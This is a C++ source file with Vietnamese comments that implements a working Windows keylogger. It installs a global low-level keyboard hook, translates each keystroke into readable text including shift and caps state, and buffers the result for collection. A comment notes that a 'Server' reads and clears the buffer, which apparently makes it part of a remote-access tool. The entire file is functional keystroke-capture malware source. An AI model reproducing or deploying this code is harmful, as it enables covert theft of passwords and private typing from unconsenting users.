#include "KeyLogger.h"

// --- BIẾN TOÀN CỤC ---
HHOOK hHook = NULL;
KeyLogger* g_LoggerInstance = nullptr;

// --- HÀM CALLBACK CỦA WINDOWS ---
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKeyBoard = (KBDLLHOOKSTRUCT*)lParam;
        int key = pKeyBoard->vkCode;

        if (g_LoggerInstance != nullptr) {
            g_LoggerInstance->OnKeyPressed(key);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}


// 1. Hàm xử lý khi có phím nhấn (Được gọi từ KeyboardProc)
void KeyLogger::OnKeyPressed(int key) {
    // Format phím thành chuỗi
    std::string keyStr = logKeystroke(key);

    // KHÓA LUỒNG (QUAN TRỌNG): Để tránh xung đột với Server khi đang đọc
    std::lock_guard<std::mutex> lock(bufferMutex);
    buffer.push_back(keyStr);
}

// 2. Hàm cho Server lấy dữ liệu
std::vector<std::string> KeyLogger::GetAndClearLogs() {
    std::lock_guard<std::mutex> lock(bufferMutex);

    // Sao chép dữ liệu ra biến tạm
    std::vector<std::string> data = buffer;

    // Xóa sạch buffer cũ để đón phím mới
    buffer.clear();

    return data;
}

// 3. Hàm định dạng chuỗi (Logic của bạn)
std::string KeyLogger::logKeystroke(int key) {
    std::string result = "";

    // --- 1. XỬ LÝ CÁC PHÍM CHỨC NĂNG ---
    switch (key) {
    case VK_RETURN: return "[ENTER]\n";
    case VK_BACK:   return "[BACK]";
    case VK_SPACE:  return " ";
    case VK_TAB:    return "[TAB]";
    case VK_ESCAPE: return "[ESC]";

    case VK_DELETE: return "[DEL]";
    case VK_INSERT: return "[INS]";
    case VK_HOME:   return "[HOME]";
    case VK_END:    return "[END]";
    case VK_PRIOR:  return "[PGUP]"; 
    case VK_NEXT:   return "[PGDN]"; 

    case VK_LEFT:   return "[LEFT]";
    case VK_UP:     return "[UP]";
    case VK_RIGHT:  return "[RIGHT]";
    case VK_DOWN:   return "[DOWN]";

        // Bỏ qua các phím bổ trợ nếu chúng đứng một mình (để đỡ rác log)
    case VK_SHIFT:   case VK_LSHIFT:   case VK_RSHIFT:
    case VK_CONTROL: case VK_LCONTROL: case VK_RCONTROL:
    case VK_MENU:    case VK_LMENU:    case VK_RMENU: 
    case VK_CAPITAL: case VK_NUMLOCK:  case VK_SCROLL:
        return "";

        // Các phím F1 - F12
    case VK_F1: return "[F1]"; case VK_F2: return "[F2]";
    case VK_F3: return "[F3]"; case VK_F4: return "[F4]";
    case VK_F5: return "[F5]"; case VK_F6: return "[F6]";
    case VK_F7: return "[F7]"; case VK_F8: return "[F8]";
    case VK_F9: return "[F9]"; case VK_F10: return "[F10]";
    case VK_F11: return "[F11]"; case VK_F12: return "[F12]";
    }


    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);


    if (GetAsyncKeyState(VK_SHIFT) & 0x8000) {
        keyboardState[VK_SHIFT] = 0x80;
    }
    if (GetKeyState(VK_CAPITAL) & 0x0001) {
        keyboardState[VK_CAPITAL] = 0x01;
    }

    // B3: Dùng ToAscii để dịch mã phím + trạng thái phím -> Ký tự
    WORD asciiChar = 0;

    UINT scanCode = MapVirtualKey(key, MAPVK_VK_TO_VSC);

    // Hàm ToAscii trả về số lượng ký tự copy được vào buffer
    int len = ToAscii(key, scanCode, keyboardState, &asciiChar, 0);

    if (len == 1) {
        // Có 1 ký tự trả về (Ví dụ: 'a', 'A', '@', '1')
        result = std::string(1, (char)asciiChar);
    }
    else if (len == 2) {

        char c = (char)asciiChar;
        result = std::string(1, c);
    }
    else {

        return "";
    }

    return result;
}

// 4. Luồng chạy Hook
void KeyLogger::WorkerThread() {
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
    if (hHook == NULL) return;

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
        if (!isRunning) break;
    }

    UnhookWindowsHookEx(hHook);
    hHook = NULL;
}

// 5. Start
void KeyLogger::Start() {
    if (isRunning) return;

    g_LoggerInstance = this;

    isRunning = true;
    hookThread = std::thread(&KeyLogger::WorkerThread, this);
}

// 6. Stop
void KeyLogger::Stop() {
    if (!isRunning) return;
    isRunning = false;

    // Hủy con trỏ toàn cục
    g_LoggerInstance = nullptr;

    if (hookThread.joinable()) {
        PostThreadMessage(GetThreadId(hookThread.native_handle()), WM_QUIT, 0, 0);
        hookThread.join();
    }
}